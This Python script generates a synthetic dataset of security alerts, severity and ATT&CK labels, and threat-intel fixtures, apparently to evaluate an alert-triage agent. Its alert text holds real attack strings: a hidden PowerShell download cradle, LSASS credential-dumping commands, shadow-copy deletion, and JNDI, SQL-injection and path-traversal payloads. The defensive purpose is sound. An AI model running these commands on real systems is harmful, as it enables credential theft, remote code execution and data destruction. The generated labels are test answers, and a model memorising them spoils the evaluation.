"""Generate the synthetic alert dataset, its labels and pinned threat-intel fixtures.

Usage:
    python scripts/generate_alerts.py            # 200 alerts, seed 7
    python scripts/generate_alerts.py --n 300 --seed 42

Writes three files:
    data/alerts.json          what the agent sees (no labels)
    evals/labels.json         ground truth: severity, ATT&CK technique, rationale
    data/intel_fixtures.json  pinned IP / hash reputation used in mock mode and evals

The labels are *proposed* by the scenario logic below. Review them by hand
(see evals/LABELING.md) before quoting accuracy numbers anywhere.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import random
from datetime import UTC, datetime, timedelta
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
TECHNIQUES = {t["id"] for t in json.loads((ROOT / "data" / "attack_techniques.json").read_text())}

# --------------------------------------------------------------------------- #
# Entity pools
# --------------------------------------------------------------------------- #
MALICIOUS_IPS = [f"185.220.101.{i}" for i in range(10, 40)] + [
    f"45.155.205.{i}" for i in range(100, 130)
] + [f"91.240.118.{i}" for i in range(160, 180)] + [f"194.26.192.{i}" for i in range(60, 80)]
MALICIOUS_META = [
    ("DE", "Tor exit relay", "Reserved"),
    ("RU", "Bulletproof hosting", "Data Center/Web Hosting/Transit"),
    ("NL", "Abused VPS provider", "Data Center/Web Hosting/Transit"),
    ("RU", "Bulletproof hosting", "Data Center/Web Hosting/Transit"),
]
RESIDENTIAL_IPS = [f"73.{random.Random(i).randint(1, 254)}.{random.Random(i * 7).randint(1, 254)}.{random.Random(i * 13).randint(1, 254)}" for i in range(60)]
RESIDENTIAL_META = [("US", "Comcast Cable", "Fixed Line ISP"), ("BR", "Vivo", "Fixed Line ISP"),
                    ("IN", "Bharti Airtel", "Mobile ISP"), ("VN", "Viettel", "Fixed Line ISP"),
                    ("NG", "MTN Nigeria", "Mobile ISP"), ("RO", "RCS & RDS", "Fixed Line ISP")]
CORP_EGRESS = ["203.0.113.10", "203.0.113.11", "198.51.100.20"]
CORP_VPN = ["104.28.14.7", "104.28.14.8"]
SCANNER_IPS = ["162.142.125.10", "167.94.138.35", "71.6.199.23"]  # internet-wide research scanners
CLOUD_STORAGE = {
    "mega.nz": "personal", "transfer.sh": "personal", "dropbox.com": "personal",
    "acme.sharepoint.com": "sanctioned", "acme-my.sharepoint.com": "sanctioned",
}

USERS = ["jsmith", "mgarcia", "lchen", "apatel", "kwilliams", "dnguyen", "rbrown", "sjohnson",
         "tmartin", "ehernandez", "bthompson", "omoore", "pjackson", "cwhite", "nlee"]
ADMINS = ["admin", "it-admin", "svc_backup", "da_jsmith", "administrator"]
HOSTS = [f"WS-{d}-{n:03d}" for d in ("FIN", "ENG", "HR", "SALES", "OPS") for n in range(1, 25)]
SERVERS = ["SRV-DC01", "SRV-DC02", "SRV-FILE01", "SRV-SQL01", "SRV-WEB01", "SRV-EXCH01", "SRV-JUMP01"]
SCANNER_HOST = "SRV-NESSUS01"

MALWARE_FAMILIES = ["Emotet", "QakBot", "AsyncRAT", "LockBit", "Cobalt Strike Beacon",
                    "RedLine Stealer", "IcedID", "AgentTesla", "Remcos", "SocGholish"]
CLEAN_SOFTWARE = ["Zoom Installer (signed: Zoom Video Communications)",
                  "7-Zip 24.08 (signed: Igor Pavlov)", "Notepad++ 8.7 (signed: Notepad++)",
                  "Slack Setup (signed: Slack Technologies)", "Python 3.12 installer (signed: PSF)",
                  "Chrome Setup (signed: Google LLC)"]
EICAR_SHA256 = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"


class Gen:
    def __init__(self, seed: int):
        self.r = random.Random(seed)
        self.intel_ips: dict[str, dict] = {}
        self.intel_hashes: dict[str, dict] = {}
        self.t0 = datetime(2026, 10, 1, tzinfo=UTC)

    # ---------------- helpers ---------------- #
    def ts(self, off_hours: bool | None = None) -> datetime:
        day = self.r.randint(0, 21)
        if off_hours is True:
            hour = self.r.choice([0, 1, 2, 3, 4, 23])
        elif off_hours is False:
            hour = self.r.randint(14, 23)  # 7am-4pm Pacific in UTC
        else:
            hour = self.r.randint(0, 23)
        return self.t0 + timedelta(days=day, hours=hour, minutes=self.r.randint(0, 59), seconds=self.r.randint(0, 59))

    def internal_ip(self) -> str:
        return f"10.20.{self.r.randint(1, 40)}.{self.r.randint(2, 250)}"

    def sha256(self, tag: str) -> str:
        return hashlib.sha256(f"{tag}-{self.r.random()}".encode()).hexdigest()

    def bad_ip(self) -> str:
        ip = self.r.choice(MALICIOUS_IPS)
        if ip not in self.intel_ips:
            idx = (0 if ip.startswith("185.") else 1 if ip.startswith("45.") else 2 if ip.startswith("91.") else 3)
            cc, isp, usage = MALICIOUS_META[idx]
            self.intel_ips[ip] = {
                "abuse_confidence_score": self.r.randint(82, 100), "country": cc, "isp": isp,
                "usage_type": usage, "total_reports": self.r.randint(150, 4000),
                "is_tor": ip.startswith("185.220."),
            }
        return ip

    def residential_ip(self) -> str:
        ip = self.r.choice(RESIDENTIAL_IPS)
        if ip not in self.intel_ips:
            cc, isp, usage = self.r.choice(RESIDENTIAL_META)
            self.intel_ips[ip] = {"abuse_confidence_score": self.r.randint(0, 6), "country": cc, "isp": isp,
                                  "usage_type": usage, "total_reports": self.r.randint(0, 2), "is_tor": False}
        return ip

    def corp_ip(self, vpn: bool = False) -> str:
        ip = self.r.choice(CORP_VPN if vpn else CORP_EGRESS)
        self.intel_ips.setdefault(ip, {
            "abuse_confidence_score": 0, "country": "US",
            "isp": "Cloudflare WARP (corporate VPN)" if vpn else "Acme Corp egress",
            "usage_type": "Content Delivery Network" if vpn else "Commercial", "total_reports": 0, "is_tor": False})
        return ip

    def scanner_ip(self) -> str:
        ip = self.r.choice(SCANNER_IPS)
        self.intel_ips.setdefault(ip, {"abuse_confidence_score": self.r.randint(35, 60), "country": "US",
                                       "isp": "Internet research scanner (Censys/Shodan)",
                                       "usage_type": "Data Center/Web Hosting/Transit",
                                       "total_reports": self.r.randint(5000, 20000), "is_tor": False})
        return ip

    def bad_hash(self) -> tuple[str, str]:
        h = self.sha256("mal")
        fam = self.r.choice(MALWARE_FAMILIES)
        self.intel_hashes[h] = {"found": True, "malicious": self.r.randint(42, 66), "suspicious": self.r.randint(0, 4),
                                "harmless": 0, "undetected": self.r.randint(4, 20), "family": fam,
                                "type": "Win32 EXE"}
        return h, fam

    def clean_hash(self) -> tuple[str, str]:
        h = self.sha256("clean")
        name = self.r.choice(CLEAN_SOFTWARE)
        self.intel_hashes[h] = {"found": True, "malicious": 0, "suspicious": 0, "harmless": 0,
                                "undetected": 72, "family": None, "type": "Win32 EXE", "known_good": name}
        return h, name

    @staticmethod
    def alert(source, rule, title, description, ts, **fields):
        a = {"source": source, "rule_name": rule, "title": title, "description": description,
             "timestamp": ts.isoformat().replace("+00:00", "Z")}
        a.update({k: v for k, v in fields.items() if v is not None})
        return a

    @staticmethod
    def label(severity, technique, rationale, scenario, accepted=None):
        assert severity in {"low", "medium", "high", "critical"}
        for t in [technique, *(accepted or [])]:
            assert t == "none" or t in TECHNIQUES, f"unknown technique {t}"
        return {"severity": severity, "technique": technique, "accepted_techniques": accepted or [],
                "rationale": rationale, "scenario": scenario}

    # ---------------- scenarios ---------------- #
    def brute_force(self):
        variant = self.r.choices(["success_bad", "bad_admin", "unknown", "benign"], [2, 3, 3, 3])[0]
        user = self.r.choice(ADMINS if variant in ("success_bad", "bad_admin") else USERS + ADMINS)
        src = self.r.choice(["okta", "windows_security"])
        mins = self.r.randint(1, 5)
        if variant == "benign":
            n, ip = self.r.randint(3, 6), self.internal_ip()
            host = self.r.choice(HOSTS)
            desc = (f"{n} failed logins for {user} from {ip} ({host}) in {mins} minutes, followed by a "
                    f"successful login. Password for {user} was changed 1 day ago.")
            return (self.alert(src, "Multiple Failed Logins", f"{n} failed logins for {user}", desc, self.ts(False),
                               user=user, src_ip=ip, host=host,
                               raw={"failed_count": n, "window_minutes": mins, "subsequent_success": True,
                                    "password_last_changed_days": 1}),
                    self.label("low", "none", "Handful of failures from the user's own workstation right after a "
                               "password change, then success: user error, not an attack.", "brute_force"))
        n = self.r.randint(40, 400)
        ip = self.bad_ip() if variant in ("success_bad", "bad_admin") else self.residential_ip()
        success = variant == "success_bad"
        desc = f"{n} failed logins for {user} from {ip} in {mins} minutes."
        if success:
            desc += f" A successful login for {user} from the same IP followed 30 seconds later."
        alert = self.alert(src, "Brute Force Login Attempt", f"Brute force against {user}", desc, self.ts(),
                           user=user, src_ip=ip, dst_host=self.r.choice(SERVERS) if src == "windows_security" else None,
                           raw={"failed_count": n, "window_minutes": mins, "subsequent_success": success,
                                "auth_type": "password"})
        if success:
            lab = self.label("critical", "T1110.001", "High-volume guessing from a known-malicious IP ending in a "
                             "successful login on a privileged account: likely account takeover.", "brute_force",
                             accepted=["T1110", "T1078"])
        elif variant == "bad_admin":
            lab = self.label("high", "T1110.001", "Sustained guessing against a privileged account from a known-"
                             "malicious IP. No success yet, but needs blocking and account review.", "brute_force",
                             accepted=["T1110"])
        else:
            lab = self.label("medium", "T1110.001", "Brute force from an IP with no bad reputation and no "
                             "success. Worth blocking and watching.", "brute_force", accepted=["T1110"])
        return alert, lab

    def password_spray(self):
        success = self.r.random() < 0.35
        ip = self.bad_ip()
        users = self.r.sample(USERS, self.r.randint(8, 15))
        desc = (f"Single IP {ip} attempted logins against {len(users)} different accounts (1-2 attempts each) "
                f"in 10 minutes using common passwords.")
        if success:
            desc += f" One attempt succeeded for {users[0]}."
        a = self.alert("okta", "Password Spray Detected", f"Password spray from {ip}", desc, self.ts(),
                       src_ip=ip, user=users[0] if success else None,
                       raw={"targeted_accounts": users, "attempts_per_account": "1-2", "successes": [users[0]] if success else []})
        if success:
            return a, self.label("critical", "T1110.003", "Spray from a malicious IP with a successful login: a "
                                 "compromised account.", "password_spray", accepted=["T1110", "T1078"])
        return a, self.label("high", "T1110.003", "Spray across many accounts from a known-malicious IP. No "
                             "success, but an active credential attack.", "password_spray", accepted=["T1110"])

    def impossible_travel(self):
        variant = self.r.choices(["vpn", "residential", "malicious"], [3, 3, 2])[0]
        user = self.r.choice(USERS)
        ip1 = self.corp_ip()
        ip2 = {"vpn": lambda: self.corp_ip(vpn=True), "residential": self.residential_ip, "malicious": self.bad_ip}[variant]()
        c2 = self.intel_ips[ip2]["country"]
        mins = self.r.randint(8, 40)
        new_device = variant == "malicious"
        desc = (f"User {user} signed in from {ip1} (US) and then from {ip2} ({c2}) {mins} minutes later. "
                f"Distance implies travel faster than possible.")
        if new_device:
            desc += " The second sign-in used a new, unregistered device and MFA was satisfied by a push approval."
        a = self.alert("azure_ad", "Impossible Travel", f"Impossible travel for {user}", desc, self.ts(),
                       user=user, src_ip=ip2,
                       raw={"first_ip": ip1, "second_ip": ip2, "minutes_between": mins, "new_device": new_device})
        if variant == "vpn":
            return a, self.label("low", "none", "Second sign-in is from the corporate VPN egress. Location "
                                 "shift is an artifact of the VPN.", "impossible_travel")
        if variant == "residential":
            return a, self.label("medium", "T1078", "Unexplained sign-in from a clean residential IP abroad. "
                                 "Could be personal VPN or a stolen session; verify with the user.",
                                 "impossible_travel", accepted=["T1078.004"])
        return a, self.label("high", "T1078", "Sign-in from a known-malicious IP on a new device with push "
                             "MFA approval: probable credential theft.", "impossible_travel",
                             accepted=["T1078.004", "T1621"])

    def powershell(self):
        variant = self.r.choices(["office_parent", "cradle", "admin"], [2, 3, 3])[0]
        host, user = self.r.choice(HOSTS), self.r.choice(USERS)
        if variant == "admin":
            cmd = r"powershell.exe -ExecutionPolicy Bypass -File C:\Windows\CCM\SystemTemp\inventory.ps1"
            a = self.alert("edr", "PowerShell Execution Policy Bypass", f"PowerShell bypass on {host}",
                           f"PowerShell started with -ExecutionPolicy Bypass on {host} by SYSTEM. Parent: ccmexec.exe "
                           f"(Microsoft SCCM client). Script path is in the SCCM cache.", self.ts(False),
                           host=host, user="SYSTEM",
                           process={"name": "powershell.exe", "command_line": cmd, "parent": "ccmexec.exe",
                                    "signed_parent": True})
            return a, self.label("low", "none", "Execution-policy bypass by the signed SCCM agent running a script "
                                 "from its own cache: routine management.", "powershell")
        ip = self.bad_ip()
        payload = f"IEX (New-Object Net.WebClient).DownloadString('http://{ip}/a.ps1')"
        import base64
        enc = base64.b64encode(payload.encode("utf-16-le")).decode()
        parent = "winword.exe" if variant == "office_parent" else "explorer.exe"
        desc = (f"Encoded PowerShell command on {host} by {user}, parent process {parent}. Decoded command downloads "
                f"and executes a script from {ip}.")
        a = self.alert("edr", "Suspicious Encoded PowerShell", f"Encoded PowerShell on {host}", desc, self.ts(),
                       host=host, user=user, dst_ip=ip,
                       process={"name": "powershell.exe", "command_line": f"powershell.exe -nop -w hidden -enc {enc}",
                                "parent": parent, "decoded": payload})
        if variant == "office_parent":
            return a, self.label("critical", "T1059.001", "Word spawning hidden PowerShell that pulls a payload from "
                                 "a malicious IP: phishing document executing on the endpoint.", "powershell",
                                 accepted=["T1566.001", "T1204.002", "T1105"])
        return a, self.label("high", "T1059.001", "Hidden encoded PowerShell download cradle to a malicious IP. "
                             "Isolate and investigate.", "powershell", accepted=["T1105", "T1027"])

    def malware_hash(self):
        variant = self.r.choices(["executed", "quarantined", "clean", "eicar"], [3, 3, 3, 1])[0]
        host, user = self.r.choice(HOSTS), self.r.choice(USERS)
        if variant == "eicar":
            h = EICAR_SHA256
            self.intel_hashes[h] = {"found": True, "malicious": 62, "suspicious": 0, "harmless": 0, "undetected": 8,
                                    "family": "EICAR-Test-File", "type": "Text"}
            a = self.alert("edr", "Malware Detected", f"Malware detected on {host}",
                           f"AV detected and quarantined eicar.com in C:\\Users\\{user}\\Downloads on {host}. "
                           f"File was not executed.", self.ts(False), host=host, user=user, file_hash=h,
                           file={"name": "eicar.com", "path": f"C:\\Users\\{user}\\Downloads\\eicar.com"},
                           raw={"action": "quarantined", "executed": False})
            return a, self.label("low", "none", "EICAR is the industry-standard harmless AV test file, quarantined "
                                 "and not executed.", "malware_hash")
        if variant == "clean":
            h, name = self.clean_hash()
            fname = name.split(" ")[0].lower() + "_setup.exe"
            a = self.alert("edr", "Unsigned/Rare Binary Executed", f"Rare binary on {host}",
                           f"{fname} executed on {host} by {user}; binary seen on fewer than 3 hosts in the fleet.",
                           self.ts(False), host=host, user=user, file_hash=h,
                           file={"name": fname, "path": f"C:\\Users\\{user}\\Downloads\\{fname}"},
                           raw={"prevalence": 2, "executed": True})
            return a, self.label("low", "none", "Hash is a known-good signed installer with zero detections. Rare "
                                 "only because few users installed it.", "malware_hash")
        h, fam = self.bad_hash()
        fname = self.r.choice(["invoice_10234.exe", "scan_doc.exe", "update.exe", "setup_x64.exe", "Payment.pdf.exe"])
        if variant == "quarantined":
            a = self.alert("edr", "Malware Detected", f"Malware detected on {host}",
                           f"AV detected {fname} on {host} and quarantined it before execution.", self.ts(),
                           host=host, user=user, file_hash=h,
                           file={"name": fname, "path": f"C:\\Users\\{user}\\Downloads\\{fname}"},
                           raw={"action": "quarantined", "executed": False})
            return a, self.label("medium", "T1204.002", f"Known {fam} sample blocked before execution. Check how it "
                                 "arrived (email, web) and whether other hosts received it.", "malware_hash",
                                 accepted=["T1566.001", "T1105"])
        a = self.alert("edr", "Malicious File Executed", f"Malicious process on {host}",
                       f"{fname} executed on {host} by {user}. AV remediation failed; the process made outbound "
                       f"network connections.", self.ts(), host=host, user=user, file_hash=h,
                       file={"name": fname, "path": f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{fname}"},
                       raw={"action": "remediation_failed", "executed": True})
        return a, self.label("critical", "T1204.002", f"Known {fam} malware executed and remediation failed: active "
                             "infection. Isolate the host.", "malware_hash", accepted=["T1204", "T1105"])

    def port_scan(self):
        variant = self.r.choices(["internet", "internal", "authorized"], [3, 2, 2])[0]
        if variant == "internet":
            ip = self.scanner_ip() if self.r.random() < 0.5 else self.bad_ip()
            ports = self.r.randint(200, 3000)
            a = self.alert("firewall", "Port Scan Detected", f"Inbound port scan from {ip}",
                           f"External IP {ip} probed {ports} ports on the perimeter firewall in 5 minutes. All "
                           f"connections were dropped.", self.ts(), src_ip=ip,
                           raw={"ports_probed": ports, "action": "dropped", "direction": "inbound"})
            return a, self.label("low", "T1595.001", "Internet background scanning against the perimeter, fully "
                                 "blocked. Common noise.", "port_scan", accepted=["T1046", "T1595.002"])
        if variant == "authorized":
            ip = self.internal_ip()
            a = self.alert("ids", "Internal Port Scan", f"Internal port scan from {SCANNER_HOST}",
                           f"{SCANNER_HOST} ({ip}) scanned 254 hosts on 10.20.0.0/16 across 1000 ports. Host is the "
                           f"vulnerability scanner; scan falls in the weekly Tuesday scan window.", self.ts(),
                           host=SCANNER_HOST, src_ip=ip, raw={"hosts_scanned": 254, "ports": 1000, "scheduled": True})
            return a, self.label("low", "none", "Authorized vulnerability scanner running its scheduled scan.",
                                 "port_scan")
        host, ip = self.r.choice(HOSTS), self.internal_ip()
        a = self.alert("ids", "Internal Port Scan", f"Internal port scan from {host}",
                       f"Workstation {host} ({ip}) connected to 180 internal hosts on ports 445, 3389, 5985 and 22 in "
                       f"3 minutes. This host has no history of scanning.", self.ts(), host=host, src_ip=ip,
                       raw={"hosts_scanned": 180, "ports": [445, 3389, 5985, 22], "scheduled": False})
        return a, self.label("high", "T1046", "A user workstation sweeping admin ports across the network suggests "
                             "an attacker doing discovery for lateral movement.", "port_scan")

    def lsass(self):
        benign = self.r.random() < 0.4
        host = self.r.choice(HOSTS + SERVERS)
        if benign:
            a = self.alert("edr", "LSASS Memory Access", f"LSASS access on {host}",
                           f"MsMpEng.exe (Microsoft Defender, signed) opened a handle to lsass.exe on {host} during a "
                           f"scheduled scan.", self.ts(), host=host, user="SYSTEM",
                           process={"name": "MsMpEng.exe", "target": "lsass.exe", "signed": True, "access": "0x1010"})
            return a, self.label("low", "none", "Signed Defender process reading LSASS during a scan is expected.",
                                 "lsass")
        user = self.r.choice(USERS + ADMINS)
        tool = self.r.choice(["procdump64.exe -ma lsass.exe C:\\Windows\\Temp\\l.dmp",
                              "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\d.bin full",
                              "mimikatz.exe sekurlsa::logonpasswords"])
        a = self.alert("edr", "LSASS Memory Access", f"LSASS dump on {host}",
                       f"Process dumped lsass.exe memory on {host} under {user}. Command: {tool}", self.ts(),
                       host=host, user=user, process={"command_line": tool, "target": "lsass.exe", "access": "0x1FFFFF"})
        return a, self.label("critical", "T1003.001", "Dumping LSASS memory steals credentials. Treat every account "
                             "on the host as compromised.", "lsass", accepted=["T1003"])

    def ransomware(self):
        host = self.r.choice(HOSTS + ["SRV-FILE01"])
        ext = self.r.choice([".locked", ".lockbit", ".enc", ".crypt"])
        n = self.r.randint(800, 9000)
        a = self.alert("edr", "Ransomware Behavior", f"Mass file encryption on {host}",
                       f"{n} files renamed to *{ext} on {host} in 2 minutes. 'vssadmin delete shadows /all /quiet' "
                       f"ran just before. Ransom note README_RESTORE.txt dropped in each folder.", self.ts(),
                       host=host, user=self.r.choice(USERS),
                       raw={"files_modified": n, "new_extension": ext, "shadow_copies_deleted": True})
        return a, self.label("critical", "T1486", "Mass encryption with shadow-copy deletion and ransom notes: "
                             "active ransomware. Isolate immediately.", "ransomware", accepted=["T1490"])

    def new_admin(self):
        approved = self.r.random() < 0.5
        host = self.r.choice(SERVERS)
        acct = self.r.choice(["svc_monitor", "helpdesk2", "support", "backup_adm", "sysadm"])
        if approved:
            a = self.alert("windows_security", "Local Admin Account Created", f"New admin account on {host}",
                           f"Account {acct} created and added to local Administrators on {host} by it-admin during "
                           f"business hours. Matches change ticket CHG-{self.r.randint(10000, 99999)}.", self.ts(False),
                           host=host, user="it-admin", raw={"new_account": acct, "change_ticket": True})
            return a, self.label("low", "none", "Admin account creation that matches an approved change ticket.",
                                 "new_admin")
        actor = self.r.choice(USERS)
        a = self.alert("windows_security", "Local Admin Account Created", f"New admin account on {host}",
                       f"Account {acct} created and added to local Administrators on {host} at 03:14 by {actor}, a "
                       f"non-IT user. No matching change ticket.", self.ts(True), host=host, user=actor,
                       raw={"new_account": acct, "change_ticket": False})
        return a, self.label("high", "T1136.001", "Off-hours admin account creation by a non-IT user with no change "
                             "ticket: likely persistence.", "new_admin", accepted=["T1098", "T1136"])

    def sched_task(self):
        benign = self.r.random() < 0.5
        host = self.r.choice(HOSTS)
        if benign:
            cmd = r'schtasks /create /tn "GoogleUpdateTaskMachineUA" /tr "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe /ua" /sc hourly'
            a = self.alert("edr", "Scheduled Task Created", f"Scheduled task on {host}",
                           f"Scheduled task GoogleUpdateTaskMachineUA created on {host} by the signed Google Update "
                           f"installer.", self.ts(False), host=host, user="SYSTEM", process={"command_line": cmd})
            return a, self.label("low", "none", "Standard Google updater task from a signed installer.", "sched_task")
        user = self.r.choice(USERS)
        cmd = (rf'schtasks /create /tn "OneDriveSync" /tr "C:\Users\{user}\AppData\Roaming\svc\upd.exe" '
               r'/sc onlogon /ru SYSTEM')
        a = self.alert("edr", "Scheduled Task Created", f"Suspicious scheduled task on {host}",
                       f"Task 'OneDriveSync' created on {host} running an unsigned binary from AppData at every logon "
                       f"as SYSTEM. Task name imitates a Microsoft component.", self.ts(), host=host, user=user,
                       process={"command_line": cmd})
        return a, self.label("high", "T1053.005", "Masquerading task running an unsigned AppData binary as SYSTEM at "
                             "logon: persistence.", "sched_task", accepted=["T1053", "T1036"] if "T1036" in TECHNIQUES else ["T1053"])

    def exfil(self):
        variant = self.r.choices(["personal_big", "sanctioned"], [2, 2])[0]
        user, host = self.r.choice(USERS), self.r.choice(HOSTS)
        if variant == "sanctioned":
            dom = self.r.choice(["acme.sharepoint.com", "acme-my.sharepoint.com"])
            gb = round(self.r.uniform(0.5, 3), 1)
            a = self.alert("proxy", "Large Upload to Cloud Storage", f"Large upload by {user}",
                           f"{user} uploaded {gb} GB to {dom} (company-sanctioned SharePoint) from {host} during work "
                           f"hours.", self.ts(False), user=user, host=host,
                           raw={"destination": dom, "bytes_out_gb": gb, "category": "sanctioned"})
            return a, self.label("low", "none", "Upload to the company's own sanctioned storage.", "exfil")
        dom = self.r.choice(["mega.nz", "transfer.sh", "dropbox.com"])
        gb = round(self.r.uniform(6, 40), 1)
        a = self.alert("proxy", "Large Upload to Cloud Storage", f"Large upload by {user}",
                       f"{user} uploaded {gb} GB to {dom} (personal cloud storage, not sanctioned) from {host} at "
                       f"02:40, well outside the user's normal hours. Files came from \\\\SRV-FILE01\\Finance.",
                       self.ts(True), user=user, host=host,
                       raw={"destination": dom, "bytes_out_gb": gb, "category": "personal", "source_share": "Finance"})
        return a, self.label("high", "T1567.002", "Many GB of finance data sent to personal cloud storage at 2am: "
                             "likely exfiltration.", "exfil", accepted=["T1567", "T1048"] if "T1048" in TECHNIQUES else ["T1567"])

    def beacon(self):
        bad = self.r.random() < 0.6
        host = self.r.choice(HOSTS)
        ip = self.bad_ip() if bad else self.residential_ip()
        iv = self.r.choice([30, 60, 300])
        a = self.alert("proxy", "Periodic Beaconing", f"Beaconing from {host}",
                       f"{host} sent HTTP POSTs to {ip} every {iv} seconds (+/- 2s jitter) for 6 hours. Small, "
                       f"uniform request sizes. User agent mimics an outdated browser.", self.ts(), host=host, dst_ip=ip,
                       raw={"interval_seconds": iv, "duration_hours": 6, "requests": int(6 * 3600 / iv)})
        if bad:
            return a, self.label("high", "T1071.001", "Regular low-jitter beaconing to a known-malicious IP: command-"
                                 "and-control traffic from an infected host.", "beacon", accepted=["T1071"])
        return a, self.label("medium", "T1071.001", "Beacon-like pattern to an IP with no bad reputation. Could be an "
                             "app heartbeat or new C2; investigate the process.", "beacon", accepted=["T1071"])

    def rdp(self):
        bad = self.r.random() < 0.5
        host = self.r.choice(SERVERS)
        ip = self.bad_ip() if bad else self.residential_ip()
        user = self.r.choice(ADMINS)
        a = self.alert("windows_security", "External RDP Login", f"RDP login to {host} from internet",
                       f"Successful RDP (logon type 10) to {host} as {user} from external IP {ip}. RDP is not supposed "
                       f"to be exposed to the internet.", self.ts(), host=host, user=user, src_ip=ip,
                       raw={"logon_type": 10, "success": True})
        if bad:
            return a, self.label("critical", "T1021.001", "Successful admin RDP from a known-malicious IP: hands-on-"
                                 "keyboard intrusion.", "rdp", accepted=["T1133", "T1078"])
        return a, self.label("high", "T1021.001", "Successful admin RDP from the open internet to a server that "
                             "should not expose RDP. Verify immediately.", "rdp", accepted=["T1133", "T1078"])

    def web_exploit(self):
        success = self.r.random() < 0.3
        ip = self.bad_ip()
        payload = self.r.choice(["${jndi:ldap://" + ip + ":1389/a}", "' OR 1=1 UNION SELECT username,password FROM users--",
                                 "../../../../etc/passwd"])
        if success:
            a = self.alert("waf", "Web Exploit Attempt", "Exploit against SRV-WEB01 succeeded",
                           f"Request from {ip} to SRV-WEB01 with payload {payload!r} returned HTTP 200. Minutes later, "
                           f"a new file shell.aspx appeared in the web root and w3wp.exe spawned cmd.exe.", self.ts(),
                           host="SRV-WEB01", src_ip=ip,
                           raw={"payload": payload, "response_code": 200, "blocked": False, "webshell": "shell.aspx"})
            return a, self.label("critical", "T1190", "Exploit succeeded and a webshell was dropped: the public web "
                                 "server is compromised.", "web_exploit", accepted=["T1505.003"] if "T1505.003" in TECHNIQUES else None)
        a = self.alert("waf", "Web Exploit Attempt", "Blocked exploit attempt against SRV-WEB01",
                       f"WAF blocked a request from {ip} to SRV-WEB01 with payload {payload!r}. HTTP 403 returned.",
                       self.ts(), host="SRV-WEB01", src_ip=ip, raw={"payload": payload, "response_code": 403, "blocked": True})
        return a, self.label("low", "T1190", "Opportunistic exploit attempt that the WAF blocked. Normal internet "
                             "noise.", "web_exploit", accepted=["T1595.002"])

    def uac(self):
        host, user = self.r.choice(HOSTS), self.r.choice(USERS)
        a = self.alert("edr", "UAC Bypass", f"UAC bypass on {host}",
                       f"Registry key HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command set to "
                       f"C:\\Users\\Public\\p.exe, then fodhelper.exe launched it with high integrity on {host}.",
                       self.ts(), host=host, user=user,
                       process={"name": "fodhelper.exe", "child": "C:\\Users\\Public\\p.exe", "integrity": "high"})
        return a, self.label("high", "T1548.002", "Classic fodhelper UAC bypass to gain elevated execution.", "uac",
                             accepted=["T1548", "T1112"])

    def mfa_fatigue(self):
        user = self.r.choice(USERS)
        ip = self.bad_ip()
        approved = self.r.random() < 0.5
        n = self.r.randint(12, 40)
        desc = f"{user} received {n} MFA push requests in 15 minutes for sign-ins from {ip}."
        desc += " The user approved the last one." if approved else " The user denied all of them."
        a = self.alert("okta", "MFA Push Fatigue", f"MFA push spam for {user}", desc, self.ts(True),
                       user=user, src_ip=ip, raw={"push_count": n, "approved": approved})
        if approved:
            return a, self.label("critical", "T1621", "MFA bombing from a malicious IP that ended in an approval: the "
                                 "attacker has a valid session.", "mfa_fatigue", accepted=["T1078"])
        return a, self.label("high", "T1621", "Attacker already has the password and is spamming MFA pushes. Reset "
                             "the password now.", "mfa_fatigue", accepted=["T1110"])

    def noise(self):
        choice = self.r.randint(0, 4)
        host, user = self.r.choice(HOSTS), self.r.choice(USERS)
        items = [
            ("edr", "AV Signature Update Failed", f"Signature update failed on {host}",
             f"Defender signature update failed on {host} (error 0x80240022). Last successful update 26 hours ago."),
            ("okta", "Account Locked Out", f"{user} locked out",
             f"{user} locked out after 5 failed attempts from their usual device at the office, then self-service "
             f"unlocked via verified MFA."),
            ("windows_security", "Certificate Expiring", "TLS certificate expiring on SRV-WEB01",
             "TLS certificate for portal.acme.example expires in 9 days."),
            ("edr", "Sensor Offline", f"EDR sensor offline on {host}",
             f"EDR sensor on {host} has not checked in for 3 days. Asset inventory shows the laptop as in repair."),
            ("windows_security", "Audit Policy Change", "Audit policy updated on SRV-DC01",
             "Audit policy changed on SRV-DC01 by it-admin via Group Policy update during the approved maintenance "
             "window."),
        ]
        src, rule, title, desc = items[choice]
        a = self.alert(src, rule, title, desc, self.ts(False), host=host if "host" in desc else None,
                       user=user if user in desc else None)
        return a, self.label("low", "none", "Operational/IT hygiene event, not a security incident.", "noise")


SCENARIOS = {
    "brute_force": 22, "password_spray": 8, "impossible_travel": 14, "powershell": 16, "malware_hash": 18,
    "port_scan": 14, "lsass": 10, "ransomware": 5, "new_admin": 10, "sched_task": 10, "exfil": 10,
    "beacon": 10, "rdp": 8, "web_exploit": 10, "uac": 5, "mfa_fatigue": 8, "noise": 22,
}


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--n", type=int, default=200)
    ap.add_argument("--seed", type=int, default=7)
    args = ap.parse_args()

    g = Gen(args.seed)
    total = sum(SCENARIOS.values())
    plan = []
    for name, w in SCENARIOS.items():
        plan += [name] * round(args.n * w / total)
    while len(plan) < args.n:
        plan.append("noise")
    plan = plan[: args.n]
    g.r.shuffle(plan)

    alerts, labels = [], {}
    for i, name in enumerate(plan, 1):
        alert, label = getattr(g, name)()
        aid = f"ALR-{i:04d}"
        alerts.append({"id": aid, **alert})
        labels[aid] = label

    (ROOT / "data" / "alerts.json").write_text(json.dumps(alerts, indent=2))
    (ROOT / "evals").mkdir(exist_ok=True)
    (ROOT / "evals" / "labels.json").write_text(json.dumps(labels, indent=2))
    (ROOT / "data" / "intel_fixtures.json").write_text(
        json.dumps({"ips": g.intel_ips, "hashes": g.intel_hashes}, indent=2, sort_keys=True))

    from collections import Counter
    sev = Counter(l["severity"] for l in labels.values())
    print(f"{len(alerts)} alerts written. Severity mix: {dict(sev)}")


if __name__ == "__main__":
    main()
